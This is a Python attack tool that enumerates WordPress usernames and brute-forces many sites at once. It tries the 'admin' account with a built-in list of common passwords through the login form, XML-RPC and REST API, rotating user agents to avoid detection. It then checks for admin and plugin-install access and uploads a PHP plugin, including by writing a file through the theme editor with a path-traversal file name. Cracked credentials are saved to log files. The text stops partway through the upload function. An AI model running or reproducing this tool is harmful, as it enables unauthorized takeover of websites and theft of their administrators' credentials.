#!/usr/bin/env python3

import requests
import re
import argparse
import concurrent.futures
import urllib3
from urllib.parse import urlparse
import sys
import time
import random
from colorama import Fore, Style, init
import os
from datetime import datetime
import json
import queue
import aiohttp
import asyncio
from functools import partial
import zipfile
import io
import base64
import xml.etree.ElementTree as ET

#By Chirag Artani 

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)  # Initialize colorama

# List of user agents to rotate through
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
]

# List of possible login paths to try (sorted by likelihood for faster checking)
LOGIN_PATHS = [
    '/wp-login.php',          # Most common path
    '/wordpress/wp-login.php',
    '/wp/wp-login.php',
    '/blog/wp-login.php',
    '/cms/wp-login.php',
    '/admin/wp-login.php',
    '/wp/login.php',
    '/site/wp-login.php',
    '/main/wp-login.php',
    '/new/wp-login.php',
    '/old/wp-login.php',
    '/backup/wp-login.php'
]

# Common WordPress login page indicators (compiled once for better performance)
WP_LOGIN_INDICATORS = re.compile(r'(wp-login|user_login|wp-submit|Log In|Username or Email Address|Password|Remember Me|Lost your password\?|wordpress_test_cookie|<input type="password"|name="log"|name="pwd")')

# Improved regex patterns for username extraction (compiled once)
AUTHOR_PATTERN = re.compile(r'/author/([^/]+)')
AUTHOR_BODY_PATTERNS = [
    re.compile(r'author-\w+">([a-z0-9_-]+)<'),
    re.compile(r'/author/([a-z0-9_-]+)/'),
    re.compile(r'"slug":"([a-z0-9_-]+)"'),
    re.compile(r'"username":"([a-z0-9_-]+)"')
]

def parse_args():
    parser = argparse.ArgumentParser(description='WordPress Username Enumeration and Password Brute Force')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-t', '--target', help='Target URL (e.g., http://example.com)')
    group.add_argument('-l', '--url-list', help='File containing list of target URLs (one per line)')
    parser.add_argument('-o', '--output', help='Output file for successful logins', default='wp_successful_logins.txt')
    parser.add_argument('--upload-output', help='Output file for plugin upload successes', default='wp_plugin_uploads.txt')
    parser.add_argument('--mode', type=int, choices=[1, 2], default=2, help='Brute force mode: 1=Fast admin-only brute force, 2=Full enumeration + brute force (default: 2)')
    parser.add_argument('--default-output', help='Output file for default brute force results', default='default-bruteforce-output.txt')
    parser.add_argument('-w', '--workers', type=int, default=20, help='Number of concurrent workers per target (default: 20)')
    parser.add_argument('-s', '--site-workers', type=int, default=10, help='Number of concurrent sites to scan (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout in seconds (default: 8)')
    parser.add_argument('--only-enumerate', action='store_true', help='Only enumerate usernames, skip brute force')
    parser.add_argument('--delay', type=float, default=0, help='Delay between requests in seconds (default: 0)')
    parser.add_argument('--resume', action='store_true', help='Resume from where the script last stopped')
    parser.add_argument('--state-file', default='wp_scanner_state.json', help='State file for resuming (default: wp_scanner_state.json)')
    parser.add_argument('--max-login-attempts', type=int, default=50, help='Maximum login attempts per username (default: 50)')
    parser.add_argument('--use-async', action='store_true', help='Use asyncio for faster enumeration')
    parser.add_argument('--common-users', help='File containing list of common WordPress usernames')
    parser.add_argument('--common-passwords', help='File containing list of common passwords')
    parser.add_argument('--fail-timeout', type=int, default=30, help='Time to wait after connection failures (default: 30)')
    return parser.parse_args()

def normalize_url(url):
    """Normalize URL by ensuring it has a scheme and ends without a trailing slash."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    parsed = urlparse(url)
    return f"{parsed.scheme}://{parsed.netloc}"

async def verify_admin_access(session, url, timeout):
    """Verify if the logged-in user has admin access by checking wp-admin dashboard"""
    try:
        admin_urls = [
            f"{url}/wp-admin/",
            f"{url}/wp-admin/index.php",
            f"{url}/wp-admin/users.php"
        ]
        
        for admin_url in admin_urls:
            try:
                headers = {'User-Agent': get_random_user_agent()}
                async with session.get(admin_url, timeout=timeout, ssl=False, headers=headers, allow_redirects=False) as response:
                    # If we get 200 and not redirected to login, we have admin access
                    if response.status == 200:
                        content = await response.text()
                        # Check for admin dashboard indicators
                        if any(indicator in content.lower() for indicator in [
                            'dashboard', 'wp-admin-bar', 'adminmenu', 'manage_options',
                            'users.php', 'plugins.php', 'themes.php', 'wp-admin/index.php'
                        ]):
                            return True
                    # If redirected to login, not admin
                    elif response.status in [301, 302]:
                        location = response.headers.get('Location', '')
                        if 'wp-login.php' in location:
                            return False
            except:
                continue
        return False
    except:
        return False

def verify_admin_access_sync(session, url, timeout):
    """Synchronous version of admin access verification"""
    try:
        admin_urls = [
            f"{url}/wp-admin/",
            f"{url}/wp-admin/index.php",
            f"{url}/wp-admin/users.php"
        ]
        
        for admin_url in admin_urls:
            try:
                headers = {'User-Agent': get_random_user_agent()}
                response = session.get(admin_url, timeout=timeout, verify=False, headers=headers, allow_redirects=False)
                
                # If we get 200 and not redirected to login, we have admin access
                if response.status_code == 200:
                    content = response.text.lower()
                    # Check for admin dashboard indicators
                    if any(indicator in content for indicator in [
                        'dashboard', 'wp-admin-bar', 'adminmenu', 'manage_options',
                        'users.php', 'plugins.php', 'themes.php', 'wp-admin/index.php'
                    ]):
                        return True
                # If redirected to login, not admin
                elif response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    if 'wp-login.php' in location:
                        return False
            except:
                continue
        return False
    except:
        return False

async def verify_plugin_installation_access(session, url, timeout):
    """Verify admin access by actually attempting to access plugin installation page"""
    try:
        plugin_install_urls = [
            f"{url}/wp-admin/plugin-install.php",
            f"{url}/wp-admin/plugin-install.php?tab=upload",
            f"{url}/wp-admin/plugins.php?page=plugin-install"
        ]
        
        for plugin_url in plugin_install_urls:
            try:
                headers = {'User-Agent': get_random_user_agent()}
                async with session.get(plugin_url, timeout=timeout, ssl=False, headers=headers, allow_redirects=False) as response:
                    if response.status == 200:
                        content = await response.text()
                        content_lower = content.lower()
                        
                        # Check for plugin installation page indicators
                        installation_indicators = [
                            'plugin-install-tab',
                            'upload-plugin',
                            'plugin-upload-form',
                            'install-plugin-upload',
                            'pluginzip',
                            'browse plugins',
                            'add plugins'
                        ]
                        
                        if any(indicator in content_lower for indicator in installation_indicators):
                            return True, plugin_url, "Plugin installation page accessible"
                            
                    elif response.status in [301, 302]:
                        location = response.headers.get('Location', '')
                        if 'wp-login.php' in location:
                            return False, plugin_url, "Redirected to login - no admin access"
            except:
                continue
                
        return False, None, "No plugin installation access found"
    except:
        return False, None, "Error checking plugin installation access"

def verify_plugin_installation_access_sync(session, url, timeout):
    """Synchronous version of plugin installation access verification"""
    try:
        plugin_install_urls = [
            f"{url}/wp-admin/plugin-install.php",
            f"{url}/wp-admin/plugin-install.php?tab=upload",
            f"{url}/wp-admin/plugins.php?page=plugin-install"
        ]
        
        for plugin_url in plugin_install_urls:
            try:
                headers = {'User-Agent': get_random_user_agent()}
                response = session.get(plugin_url, timeout=timeout, verify=False, headers=headers, allow_redirects=False)
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Check for plugin installation page indicators
                    installation_indicators = [
                        'plugin-install-tab',
                        'upload-plugin',
                        'plugin-upload-form',
                        'install-plugin-upload',
                        'pluginzip',
                        'browse plugins',
                        'add plugins'
                    ]
                    
                    if any(indicator in content for indicator in installation_indicators):
                        return True, plugin_url, "Plugin installation page accessible"
                        
                elif response.status_code in [301, 302]:
                    location = response.headers.get('Location', '')
                    if 'wp-login.php' in location:
                        return False, plugin_url, "Redirected to login - no admin access"
            except:
                continue
                
        return False, None, "No plugin installation access found"
    except:
        return False, None, "Error checking plugin installation access"

def write_plugin_verification_result(output_file, url, username, password, method, has_access, plugin_url, access_details):
    """Write detailed plugin verification results to file"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        if has_access:
            f.write(f"[{timestamp}] {url} - {username}:{password} - {method} - VERIFIED ADMIN ACCESS\n")
            f.write(f"  → Plugin installation page: {plugin_url}\n")
            f.write(f"  → Access details: {access_details}\n\n")
        else:
            f.write(f"[{timestamp}] {url} - {username}:{password} - {method} - FALSE POSITIVE (No admin access)\n")
            f.write(f"  → Reason: {access_details}\n\n")

def get_random_user_agent():
    """Return a random user agent from the list"""
    return random.choice(USER_AGENTS)

def print_status(message, status='info'):
    """Print status messages with color coding and timestamp"""
    status_colors = {
        'info': Fore.BLUE,
        'success': Fore.GREEN,
        'error': Fore.RED,
        'warning': Fore.YELLOW
    }
    color = status_colors.get(status, Fore.WHITE)
    timestamp = datetime.now().strftime('%H:%M:%S')
    print(f"[{timestamp}] {color}[{status.upper()}]{Style.RESET_ALL} {message}")

def create_test_plugin_zip():
    """Create a test WordPress plugin ZIP file in memory"""
    # Create the plugin content
    plugin_content = '''<?php
/**
 * Plugin Name: Kishore Test Plugin
 * Description: Simple test plugin for security testing
 * Version: 1.0
 * Author: Security Tester
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Simple output for verification
echo "kishoriya";

// Add admin menu for testing
add_action('admin_menu', 'kishore_add_admin_menu');

function kishore_add_admin_menu() {
    add_options_page('Kishore Test', 'Kishore Test', 'manage_options', 'kishore-test', 'kishore_admin_page');
}

function kishore_admin_page() {
    echo '<div class="wrap"><h1>Kishore Test Plugin</h1><p>This is a test plugin for security assessment.</p></div>';
}
?>'''

    # Create ZIP file in memory
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        # Create directory structure
        zip_file.writestr('kishore/hello.php', plugin_content)
        zip_file.writestr('kishore/readme.txt', '''=== Kishore Test Plugin ===
Contributors: securitytester
Tags: test, security
Requires at least: 4.0
Tested up to: 6.0
Stable tag: 1.0
License: GPL v2 or later

A simple test plugin for security assessment purposes.

== Description ==

This is a test plugin used for security assessment. It contains minimal functionality.

== Installation ==

1. Upload the plugin files to the `/wp-content/plugins/kishore` directory.
2. Activate the plugin through the 'Plugins' screen in WordPress.

== Changelog ==

= 1.0 =
* Initial release
''')
    
    zip_buffer.seek(0)
    return zip_buffer.getvalue()

def get_wp_base_path(login_path):
    """Extract WordPress base path from login path"""
    if login_path == '/wp-login.php':
        return ''
    else:
        return login_path.replace('/wp-login.php', '')

def write_plugin_upload_success(upload_output_file, url, username, password, upload_method, plugin_url):
    """Write successful plugin upload to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(upload_output_file, 'a') as f:
        f.write(f"[{timestamp}] {url} - {username}:{password} - {upload_method} - {plugin_url}\n")

def write_default_bruteforce_success(output_file, url, username, password, method):
    """Write successful default brute force login to file with timestamp"""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(output_file, 'a') as f:
        f.write(f"[{timestamp}] {url} - {username}:{password} - {method}\n")

def get_admin_password_list():
    """Get the specific password list for admin user brute force"""
    return [
        'admin123', 'Aa123456', 'Avfr4bgt5', 'admin12345', 'P@ssw0rd', 
        'admin', 'admin888', 'Passw0rd', '123456', '12345678', 
        'password', '88888888', 'Qq123456', 'Admin888', 'Admin123'
    ]

async def async_xmlrpc_login(url, username, password, timeout, session):
    """Try XML-RPC login method using asyncio"""
    try:
        # Try different XML-RPC endpoints
        xmlrpc_urls = [
            f"{url}/xmlrpc.php",
            f"{url}/wordpress/xmlrpc.php", 
            f"{url}/wp/xmlrpc.php",
            f"{url}/blog/xmlrpc.php"
        ]
        
        # Create XML-RPC request body
        xml_body = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value><string>{username}</string></value></param>
        <param><value><string>{password}</string></value></param>
    </params>
</methodCall>'''
        
        headers = {
            'User-Agent': get_random_user_agent(),
            'Content-Type': 'text/xml',
            'Content-Length': str(len(xml_body))
        }
        
        for xmlrpc_url in xmlrpc_urls:
            try:
                async with session.post(xmlrpc_url, data=xml_body, headers=headers, 
                                      timeout=timeout, ssl=False) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        # Check if login was successful (no fault in response)
                        if '<fault>' not in response_text and '<methodResponse>' in response_text:
                            return True, "XML-RPC"
            except Exception:
                continue
                
    except Exception:
        pass
        
    return False, "XML-RPC"

def xmlrpc_login(url, username, password, timeout):
    """Try XML-RPC login method"""
    try:
        # Try different XML-RPC endpoints
        xmlrpc_urls = [
            f"{url}/xmlrpc.php",
            f"{url}/wordpress/xmlrpc.php", 
            f"{url}/wp/xmlrpc.php",
            f"{url}/blog/xmlrpc.php"
        ]
        
        # Create XML-RPC request body
        xml_body = f'''<?xml version="1.0"?>
<methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
        <param><value><string>{username}</string></value></param>
        <param><value><string>{password}</string></value></param>
    </params>
</methodCall>'''
        
        headers = {
            'User-Agent': get_random_user_agent(),
            'Content-Type': 'text/xml',
            'Content-Length': str(len(xml_body))
        }
        
        for xmlrpc_url in xmlrpc_urls:
            try:
                response = requests.post(xmlrpc_url, data=xml_body, headers=headers, 
                                       timeout=timeout, verify=False)
                if response.status_code == 200:
                    # Check if login was successful (no fault in response)
                    if '<fault>' not in response.text and '<methodResponse>' in response.text:
                        return True, "XML-RPC"
            except Exception:
                continue
                
    except Exception:
        pass
        
    return False, "XML-RPC"

async def async_rest_api_login(url, username, password, timeout, session):
    """Try REST API login method using asyncio"""
    try:
        # Try JWT authentication endpoint (common plugin)
        jwt_url = f"{url}/wp-json/jwt-auth/v1/token"
        
        headers = {
            'User-Agent': get_random_user_agent(),
            'Content-Type': 'application/json'
        }
        
        login_data = {
            'username': username,
            'password': password
        }
        
        try:
            async with session.post(jwt_url, json=login_data, headers=headers,
                                  timeout=timeout, ssl=False) as response:
                if response.status == 200:
                    response_text = await response.text()
                    try:
                        resp_json = json.loads(response_text)
                        if 'token' in resp_json:
                            return True, "REST API JWT"
                    except:
                        pass
        except Exception:
            pass
            
        # Try basic REST API with authentication
        users_url = f"{url}/wp-json/wp/v2/users/me"
        
        # Create basic auth header
        import base64
        credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers = {
            'User-Agent': get_random_user_agent(),
            'Authorization': f'Basic {credentials}'
        }
        
        try:
            async with session.get(users_url, headers=headers, timeout=timeout, ssl=False) as response:
                if response.status == 200:
                    response_text = await response.text()
                    try:
                        resp_json = json.loads(response_text)
                        if 'id' in resp_json and resp_json.get('username') == username:
                            return True, "REST API Basic"
                    except:
                        pass
        except Exception:
            pass
            
    except Exception:
        pass
        
    return False, "REST API"

def rest_api_login(url, username, password, timeout):
    """Try REST API login method"""
    try:
        # Try JWT authentication endpoint (common plugin)
        jwt_url = f"{url}/wp-json/jwt-auth/v1/token"
        
        headers = {
            'User-Agent': get_random_user_agent(),
            'Content-Type': 'application/json'
        }
        
        login_data = {
            'username': username,
            'password': password
        }
        
        try:
            response = requests.post(jwt_url, json=login_data, headers=headers,
                                   timeout=timeout, verify=False)
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if 'token' in resp_json:
                        return True, "REST API JWT"
                except:
                    pass
        except Exception:
            pass
            
        # Try basic REST API with authentication
        users_url = f"{url}/wp-json/wp/v2/users/me"
        
        # Create basic auth header
        credentials = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers = {
            'User-Agent': get_random_user_agent(),
            'Authorization': f'Basic {credentials}'
        }
        
        try:
            response = requests.get(users_url, headers=headers, timeout=timeout, verify=False)
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    if 'id' in resp_json and resp_json.get('username') == username:
                        return True, "REST API Basic"
                except:
                    pass
        except Exception:
            pass
            
    except Exception:
        pass
        
    return False, "REST API"

async def async_stealth_login(url, username, password, timeout, session):
    """Try multiple stealth login methods using asyncio"""
    methods = [
        async_xmlrpc_login,
        async_rest_api_login,
        lambda u, un, pw, t, s: async_try_login(u, '/wp-login.php', un, pw, t, s)
    ]
    
    for method in methods:
        try:
            if method == methods[-1]:  # Regular login method
                result = await method(url, username, password, timeout, session)
                if result:
                    return True, "Standard Login"
            else:  # Stealth methods
                result, method_name = await method(url, username, password, timeout, session)
                if result:
                    return True, method_name
        except Exception:
            continue
            
    return False, "None"

def stealth_login(url, username, password, timeout):
    """Try multiple stealth login methods"""
    methods = [
        xmlrpc_login,
        rest_api_login,
        lambda u, un, pw, t: try_login(u, '/wp-login.php', un, pw, t)
    ]
    
    for method in methods:
        try:
            if method == methods[-1]:  # Regular login method
                result = method(url, username, password, timeout)
                if result:
                    return True, "Standard Login"
            else:  # Stealth methods
                result, method_name = method(url, username, password, timeout)
                if result:
                    return True, method_name
        except Exception:
            continue
            
    return False, "None"

async def async_fast_admin_bruteforce(url, timeout, workers, verbose, output_file, delay=0):
    """Fast admin-only brute force using stealth methods with asyncio"""
    print_status(f"Starting fast admin brute force on {url} with {workers} workers")
    
    username = "admin"
    passwords = get_admin_password_list()
    successful_logins = []
    total_attempts = 0
    
    # Create a connection pool for better performance
    connector = aiohttp.TCPConnector(limit=workers, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        
        print_status(f"Trying {len(passwords)} passwords for admin user on {url}")
        
        # Create tasks for all password attempts
        login_tasks = []
        for password in passwords:
            task = asyncio.create_task(
                async_stealth_login(url, username, password, timeout, session)
            )
            login_tasks.append((task, password))
            
            # Add delay if specified
            if delay > 0:
                await asyncio.sleep(delay)
                
        # Process login attempts
        for task, password in login_tasks:
            total_attempts += 1
            
            try:
                result, method = await task
                if result:
                    # Double-check plugin installation access
                    connector = aiohttp.TCPConnector(ssl=False)
                    async with aiohttp.ClientSession(connector=connector) as verify_session:
                        # Re-login to get session for verification
                        login_url = f"{url}/wp-login.php"
                        login_data = {
                            'log': username.strip(),
                            'pwd': password,
                            'wp-submit': 'Log In',
                            'testcookie': '1'
                        }
                        headers = {
                            'User-Agent': get_random_user_agent(),
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                        
                        try:
                            async with verify_session.post(login_url, data=login_data, headers=headers, timeout=timeout, ssl=False) as login_response:
                                # Now verify plugin installation access
                                has_plugin_access, plugin_url, access_details = await verify_plugin_installation_access(verify_session, url, timeout)
                                
                                if has_plugin_access:
                                    credential = f"{username}:{password}"
                                    successful_logins.append(credential)
                                    print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method} - PLUGIN ACCESS VERIFIED", "success")
                                    
                                    # Write verified success to file
                                    write_default_bruteforce_success(output_file, url, username, password, method)
                                    
                                    # Write detailed plugin verification
                                    plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
                                    write_plugin_verification_result(plugin_log_file, url, username, password, method, True, plugin_url, access_details)
                                else:
                                    print_status(f"✗ FALSE POSITIVE: {url} - {username}:{password} - Method: {method} - No plugin installation access", "warning")
                                    
                                    # Log false positive
                                    plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
                                    write_plugin_verification_result(plugin_log_file, url, username, password, method, False, plugin_url, access_details)
                        except:
                            print_status(f"✗ VERIFICATION FAILED: {url} - {username}:{password} - Method: {method}", "error")
                    
                    # Cancel remaining tasks since we found valid credentials
                    for remaining_task, _ in login_tasks:
                        if not remaining_task.done():
                            remaining_task.cancel()
                            
                    break
                elif verbose:
                    print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
            except asyncio.CancelledError:
                # Task was cancelled, just continue
                pass
            except Exception as e:
                if verbose:
                    print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
    
    print_status(f"Fast admin brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
    return successful_logins

def fast_admin_bruteforce(url, timeout, workers, verbose, output_file, delay=0):
    """Fast admin-only brute force using stealth methods"""
    print_status(f"Starting fast admin brute force on {url} with {workers} workers")
    
    username = "admin"
    passwords = get_admin_password_list()
    successful_logins = []
    total_attempts = 0
    
    print_status(f"Trying {len(passwords)} passwords for admin user on {url}")
    
    # Use ThreadPoolExecutor for concurrent login attempts
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {}
        for password in passwords:
            future = executor.submit(stealth_login, url, username, password, timeout)
            futures[future] = password
            
        # Process futures as they complete
        for future in concurrent.futures.as_completed(futures):
            password = futures[future]
            total_attempts += 1
            
            try:
                result, method = future.result()
                if result:
                    # Double-check plugin installation access
                    verify_session = requests.Session()
                    login_url = f"{url}/wp-login.php"
                    login_data = {
                        'log': username.strip(),
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'testcookie': '1'
                    }
                    headers = {
                        'User-Agent': get_random_user_agent(),
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                    
                    try:
                        login_response = verify_session.post(login_url, data=login_data, headers=headers, timeout=timeout, verify=False)
                        
                        # Now verify plugin installation access
                        has_plugin_access, plugin_url, access_details = verify_plugin_installation_access_sync(verify_session, url, timeout)
                        
                        if has_plugin_access:
                            credential = f"{username}:{password}"
                            successful_logins.append(credential)
                            print_status(f"✓ ADMIN SUCCESS: {url} - {credential} - Method: {method} - PLUGIN ACCESS VERIFIED", "success")
                            
                            # Write verified success to file
                            write_default_bruteforce_success(output_file, url, username, password, method)
                            
                            # Write detailed plugin verification
                            plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
                            write_plugin_verification_result(plugin_log_file, url, username, password, method, True, plugin_url, access_details)
                        else:
                            print_status(f"✗ FALSE POSITIVE: {url} - {username}:{password} - Method: {method} - No plugin installation access", "warning")
                            
                            # Log false positive
                            plugin_log_file = output_file.replace('.txt', '_verified_admin.txt')
                            write_plugin_verification_result(plugin_log_file, url, username, password, method, False, plugin_url, access_details)
                    except:
                        print_status(f"✗ VERIFICATION FAILED: {url} - {username}:{password} - Method: {method}", "error")
                    
                    # Cancel remaining futures since we found valid credentials
                    for f in futures:
                        if not f.done():
                            f.cancel()
                            
                    break
                elif verbose:
                    print_status(f"✗ Failed: {url} - {username}:{password}", "warning")
            except Exception as e:
                if verbose:
                    print_status(f"Error trying {url} - {username}:{password}: {str(e)}", "error")
            
            # Add delay if specified
            if delay > 0:
                time.sleep(delay)

    print_status(f"Fast admin brute force completed on {url}. {total_attempts} attempts. {len(successful_logins)} successful logins.", "info")
    return successful_logins

async def async_process_single_site_mode1(url, args):
    """Process a single WordPress site using mode 1 (fast admin brute force) with asyncio"""
    normalized_url = normalize_url(url)
    
    try:
        results = await async_fast_admin_bruteforce(
            normalized_url, args.timeout, args.workers, 
            args.verbose, args.default_output, args.delay
        )
        return results
        
    except Exception as e:
        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        
        # Wait after failure to avoid rate limiting
        print_status(f"Waiting {args.fail_timeout} seconds before continuing...", "warning")
        await asyncio.sleep(args.fail_timeout)
        
        return []

def process_single_site_mode1(url, args):
    """Process a single WordPress site using mode 1 (fast admin brute force)"""
    normalized_url = normalize_url(url)
    
    try:
        results = fast_admin_bruteforce(
            normalized_url, args.timeout, args.workers, 
            args.verbose, args.default_output, args.delay
        )
        return results
        
    except Exception as e:
        print_status(f"Error processing {normalized_url}: {str(e)}", "error")
        if args.verbose:
            import traceback
            traceback.print_exc()
        
        # Wait after failure to avoid rate limiting
        print_status(f"Waiting {args.fail_timeout} seconds before continuing...", "warning")
        time.sleep(args.fail_timeout)
        
        return []

async def async_test_plugin_upload(url, login_path, username, password, timeout, session, upload_output_file):
    """Test plugin upload capabilities using multiple methods with asyncio"""
    upload_methods_tested = []
    successful_uploads = []

    # Get WordPress base path for correct URL construction
    wp_base_path = get_wp_base_path(login_path)

    try:
        login_url = f"{url}{login_path}"
        
        # Prepare login data
        login_data = {
            'log': username.strip(),
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Attempt login
        headers = {
            'User-Agent': get_random_user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': login_url
        }

        async with session.post(login_url, data=login_data, headers=headers,
                             allow_redirects=True, timeout=timeout, ssl=False) as response:
            
            # Check if login was successful
            if wp_base_path + '/wp-admin/' not in str(response.url) and '/wp-admin/' not in str(response.url):
                return upload_methods_tested, successful_uploads

            # Method 1: Direct plugin upload via admin interface
            upload_url = f"{url}{wp_base_path}/wp-admin/plugin-install.php?tab=upload"
            try:
                async with session.get(upload_url, timeout=timeout, ssl=False) as upload_page:
                    if upload_page.status == 200:
                        upload_text = await upload_page.text()
                        # Look for nonce in the upload form
                        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_text)
                        if nonce_match:
                            nonce = nonce_match.group(1)
                            
                            # Create the plugin ZIP
                            plugin_zip = create_test_plugin_zip()
                            
                            # Prepare multipart form data
                            form_data = aiohttp.FormData()
                            form_data.add_field('_wpnonce', nonce)
                            form_data.add_field('_wp_http_referer', f'{wp_base_path}/wp-admin/plugin-install.php?tab=upload')
                            form_data.add_field('install-plugin-submit', 'Install Now')
                            form_data.add_field('pluginzip', plugin_zip, filename='kishore.zip', content_type='application/zip')
                            
                            # Upload the plugin using correct WordPress path
                            upload_endpoint = f"{url}{wp_base_path}/wp-admin/update.php?action=upload-plugin"
                            async with session.post(upload_endpoint, data=form_data, timeout=timeout, ssl=False) as upload_response:
                                upload_methods_tested.append("Direct Admin Upload")
                                
                                if upload_response.status == 200:
                                    upload_resp_text = await upload_response.text()
                                    if 'Plugin installed successfully' in upload_resp_text or 'successfully' in upload_resp_text.lower():
                                        # Test if the plugin file is accessible
                                        test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
                                        async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
                                            if test_response.status == 200:
                                                test_resp_text = await test_response.text()
                                                if 'kishoriya' in test_resp_text:
                                                    successful_uploads.append(("Direct Admin Upload", test_url))
                                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - Direct Admin Upload - {test_url}", "success")
                                                    write_plugin_upload_success(upload_output_file, url, username, password, "Direct Admin Upload", test_url)
            except Exception:
                upload_methods_tested.append("Direct Admin Upload (Failed)")

            # Method 2: REST API upload (if available)
            try:
                rest_upload_url = f"{url}{wp_base_path}/wp-json/wp/v2/plugins"
                plugin_zip = create_test_plugin_zip()
                
                headers_rest = {
                    'User-Agent': get_random_user_agent(),
                    'Content-Type': 'application/zip',
                    'Content-Disposition': 'attachment; filename="kishore.zip"'
                }
                
                async with session.post(rest_upload_url, data=plugin_zip, headers=headers_rest,
                                      timeout=timeout, ssl=False) as rest_response:
                    upload_methods_tested.append("REST API Upload")
                    
                    if rest_response.status in [200, 201]:
                        # Test if the plugin file is accessible
                        test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
                        async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
                            if test_response.status == 200:
                                test_resp_text = await test_response.text()
                                if 'kishoriya' in test_resp_text:
                                    successful_uploads.append(("REST API Upload", test_url))
                                    print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - REST API Upload - {test_url}", "success")
                                    write_plugin_upload_success(upload_output_file, url, username, password, "REST API Upload", test_url)
            except Exception:
                upload_methods_tested.append("REST API Upload (Failed)")

            # Method 3: File manager / direct file upload
            try:
                file_manager_urls = [
                    f"{url}{wp_base_path}/wp-admin/theme-editor.php",
                    f"{url}{wp_base_path}/wp-admin/plugin-editor.php"
                ]
                
                for fm_url in file_manager_urls:
                    async with session.get(fm_url, timeout=timeout, ssl=False) as fm_response:
                        if fm_response.status == 200 and 'wp-login.php' not in str(fm_response.url):
                            fm_text = await fm_response.text()
                            if 'theme-editor' in fm_text or 'plugin-editor' in fm_text:
                                # Try to create plugin via editor
                                nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', fm_text)
                                if nonce_match:
                                    nonce = nonce_match.group(1)
                                    
                                    plugin_content = '''<?php
/**
 * Plugin Name: Kishore Test Plugin
 * Description: Simple test plugin for security testing
 * Version: 1.0
 */
if (!defined('ABSPATH')) exit;
echo "kishoriya";
?>'''
                                    
                                    # Attempt to create the plugin file
                                    create_data = {
                                        '_wpnonce': nonce,
                                        'action': 'edit-theme-plugin-file',
                                        'file': '../plugins/kishore/hello.php',
                                        'newcontent': plugin_content,
                                        'docs-list': '',
                                        'submit': 'Update File'
                                    }
                                    
                                    async with session.post(fm_url, data=create_data, timeout=timeout, ssl=False) as create_response:
                                        upload_methods_tested.append("File Manager Upload")
                                        
                                        if create_response.status == 200:
                                            # Test if the plugin file is accessible
                                            test_url = f"{url}{wp_base_path}/wp-content/plugins/kishore/hello.php"
                                            async with session.get(test_url, timeout=timeout, ssl=False) as test_response:
                                                if test_response.status == 200:
                                                    test_resp_text = await test_response.text()
                                                    if 'kishoriya' in test_resp_text:
                                                        successful_uploads.append(("File Manager Upload", test_url))
                                                        print_status(f"🎉 PLUGIN UPLOAD SUCCESS: {url} - {username}:{password} - File Manager Upload - {test_url}", "success")
                                                        write_plugin_upload_success(upload_output_file, url, username, password, "File Manager Upload", test_url)
                                break
            except Exception:
                upload_methods_tested.append("File Manager Upload (Failed)")

    except Exception as e:
        print_status(f"Error during plugin upload test: {str(e)}", "error")

